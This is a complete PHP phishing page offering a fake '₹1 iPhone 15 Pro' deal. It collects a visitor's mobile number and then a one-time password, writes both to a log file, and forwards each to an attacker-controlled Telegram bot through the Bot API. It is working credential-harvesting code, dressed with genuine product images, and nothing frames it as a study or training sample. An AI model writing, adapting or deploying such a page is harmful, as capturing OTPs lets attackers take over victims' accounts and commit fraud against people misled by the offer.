<?php
// Function to send data to Telegram
function sendToTelegram($message, $token, $chat_id) {
    $url = "https://api.telegram.org/bot$token/sendMessage";
    $data = [
        'chat_id' => $chat_id,
        'text' => $message
    ];
    $options = [
        'http' => [
            'method'  => 'POST',
            'header'  => 'Content-Type: application/x-www-form-urlencoded',
            'content' => http_build_query($data)
        ]
    ];
    $context = stream_context_create($options);
    file_get_contents($url, false, $context);
}

$bot_token = "YOUR_BOT_TOKEN";  // Replace with your bot's token
$chat_id = "YOUR_CHAT_ID";      // Replace with your chat ID

// Start logging if form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (isset($_POST['mobile'])) {
        $mobile = $_POST['mobile'];
        file_put_contents("logs.txt", "Mobile: $mobile\n", FILE_APPEND);

        // Send the mobile number to Telegram
        sendToTelegram("📱 Mobile: $mobile", $bot_token, $chat_id);

        $step = "otp";
    } elseif (isset($_POST['otp'])) {
        $otp = $_POST['otp'];
        file_put_contents("logs.txt", "OTP: $otp\n", FILE_APPEND);

        // Send the OTP to Telegram
        sendToTelegram("🔐 OTP: $otp", $bot_token, $chat_id);

        $step = "done";
    }
} else {
    $step = "mobile";
}
?>

<!DOCTYPE html>
<html>
<head>
  <title>🔥 iPhone ₹1 Offer 🔥</title>
  <style>
    body {
      background-image: url('https://m.media-amazon.com/images/I/81SigpJN1KL._SL1500_.jpg');
      background-size: 300px;
      background-repeat: repeat;
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
    }
    .overlay {
      background-color: rgba(255, 255, 255, 0.95);
      padding: 50px;
      max-width: 400px;
      margin: 100px auto;
      border-radius: 10px;
      box-shadow: 0 0 15px rgba(0,0,0,0.2);
      text-align: center;
    }
    input {
      padding: 10px;
      width: 90%;
      margin: 10px 0;
      border-radius: 5px;
      border: 1px solid #ccc;
    }
    button {
      padding: 10px 20px;
      background-color: #ff3b30;
      border: none;
      color: white;
      font-weight: bold;
      border-radius: 5px;
      cursor: pointer;
    }
    h1, h2 {
      color: #d10000;
    }
    img {
      width: 100%;
      border-radius: 10px;
    }
  </style>
</head>
<body>

<div class="overlay">
  <?php if ($step == "mobile"): ?>
    <h1>🔥 iPhone 15 Pro Just ₹1! 🔥</h1>
    <img src="https://store.storeimages.cdn-apple.com/4982/as-images.apple.com/is/iphone-15-pro-model-unselect-gallery-1-202309?wid=5120&hei=2880&fmt=jpeg&qlt=90&.v=1692936962211">
    <p>Limited Time Offer! Enter your mobile number to grab now:</p>
    <form method="POST">
      <input type="text" name="mobile" placeholder="Enter Mobile Number" required>
      <button type="submit">Get OTP</button>
    </form>

  <?php elseif ($step == "otp"): ?>
    <h2>Enter OTP sent to your number</h2>
    <form method="POST">
      <input type="text" name="otp" placeholder="Enter OTP" required>
      <button type="submit">Submit OTP</button>
    </form>

  <?php else: ?>
    <h2>✅ OTP Verified! Thank you for participating.</h2>
  <?php endif; ?>
</div>

</body>
</html>
